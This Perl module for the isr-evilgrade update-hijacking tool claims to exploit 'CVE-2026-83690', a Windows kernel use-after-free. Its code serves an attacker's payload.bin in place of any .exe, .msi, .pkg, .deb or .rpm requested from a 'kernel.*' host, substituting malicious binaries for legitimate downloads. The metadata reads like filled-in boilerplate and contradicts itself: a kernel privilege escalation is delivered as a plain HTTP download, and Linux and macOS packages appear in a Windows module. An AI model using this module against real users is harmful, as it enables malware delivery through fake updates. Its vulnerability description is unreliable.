###############
# windows_kernel_uaf.pm
#
# CVE-2026-83690: PrivEsc Vulnerability
# Type: PrivEsc
# CVSS: 8.5
# Year: 2026
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.

package modules::windows_kernel_uaf;

use strict;
use Data::Dump qw(dump);
use isrcore::utils;

my $base = {
    'name'        => 'windows_kernel_uaf',
    'version'     => '1.0',
    'cvss'        => '8.5',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>', 'Security Research Team'],
    'description' => qq{
Exploits CVE-2026-83690: PrivEsc vulnerability.
CVSS Score: 8.5
Vector: PrivEsc
Year Disclosed: 2026
Payload: Use-After-Free
    },
    'vh' => 'kernel.*',
    'request' => [
        {
            'req'   => '/.*\\.exe|\\.msi|\\.pkg|\\.deb|\\.rpm',
            'type'  => 'file',
            'file'  => './include/windows_kernel_uaf/payload.bin',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/octet-stream\r\n"
                . "Content-Disposition: attachment; filename=Use-After-Free\r\n"
                . "Connection: close\r\n\r\n",
        },
    ],
};

sub new {
    my $class = shift;
    my $self = $base;
    bless( $self, $class );
    return $self;
}

1;
